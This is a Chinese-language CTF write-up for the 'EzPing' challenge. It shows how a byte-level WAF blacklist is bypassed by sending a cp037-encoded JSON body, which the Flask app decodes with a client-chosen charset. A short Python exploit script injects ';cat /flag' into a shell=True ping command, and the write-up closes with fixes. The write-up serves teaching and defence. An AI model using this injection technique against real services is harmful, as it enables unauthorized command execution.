# EzPing

## 题目简述

服务提供 `POST /api/ping`，从 JSON 的 `target` 字段拼接 `ping -c 1 <target>` 后以 `shell=True` 执行。长度只限制为 50 个字符。表面上，`before_request` 中的 WAF 会在原始请求字节中拒绝 `flag`、`cat`、`;`、`|` 等命令和分隔符；但应用将 `Request.charset` 改为由攻击者提交的 `Content-Type` 参数决定，业务代码随后用 `request.get_data(as_text=True)` 按该字符集解码。

因此 WAF 与 JSON 解析器观察的并不是同一份文本：前者检查未经解码的字节，后者可被声明为 EBCDIC 兼容编码后的字符串。决定性漏洞是跨层字符集解释不一致导致的命令注入绕过。

## 解题过程

### 关键观察

关键代码的顺序如下：

```python
raw_data = request.get_data()
for word in blacklist:
    if word in raw_data:
        return jsonify({'error': 'No hacker!'}), 403

raw_text = request.get_data(as_text=True)
data = json.loads(raw_text)
command = f"ping -c 1 {data['target']}"
subprocess.run(command, shell=True, capture_output=True, text=True, timeout=5)
```

`CustomRequest.charset` 直接返回 `Content-Type` 的 `charset` 参数。选择 Python 支持、但 ASCII 字节映射不同的 `cp037` 后，普通 JSON 与其中的 `;cat /flag` 都会编码成不包含 ASCII `b';'`、`b'cat'`、`b'flag'` 的字节序列；WAF 放行后，同一字节序列又会被 `cp037` 还原为可被 `json.loads` 接受的 JSON。

### 构造请求

下面的最小脚本先生成业务层实际要看到的 JSON，再以 `cp037` 编码发送。`BASE` 应替换为比赛实例地址。

```python
import json
import requests

body = json.dumps({"target": "127.0.0.1;cat /flag"}, separators=(",", ":"))
response = requests.post(
    "BASE/api/ping",
    data=body.encode("cp037"),
    headers={"Content-Type": "application/json; charset=cp037"},
    timeout=10,
)
print(response.text)
```

这里不应把 payload 先按 UTF-8 发送：那样黑名单会在原始字节中直接命中分号和命令字符串。也不需要绕过 JSON；`cp037` 解码发生在 `json.loads` 之前，所以它接收到的仍是标准 JSON。

### 验证

静态验证点有三个：请求体字节不含 WAF 逐项匹配的 ASCII 子串；`cp037` 解码后等于原 `body`；`target` 最终包含 shell 分隔符且少于 50 个字符。成功时 `/api/ping` 的 JSON `output` 是 `cat /flag` 的标准输出，作为 flag 的回显通道。

未对已关闭的比赛实例执行请求；上述链路依据题目提供的 Flask 源码核对。

## 方法总结

- 核心技巧：利用原始字节 WAF 与可控字符集解码之间的解释差异，恢复被过滤的命令分隔符。
- 识别信号：WAF 用 `get_data()` 检查 bytes，而业务层用 `get_data(as_text=True)`、`request.data` 或框架自动解析正文，并且 `charset` 可由客户端指定。
- 复用要点：先逐字节验证过滤器实际匹配的编码，再验证业务解码后的字符串；修复应固定 UTF-8 并在同一规范化文本上做允许列表校验，同时避免 `shell=True`。
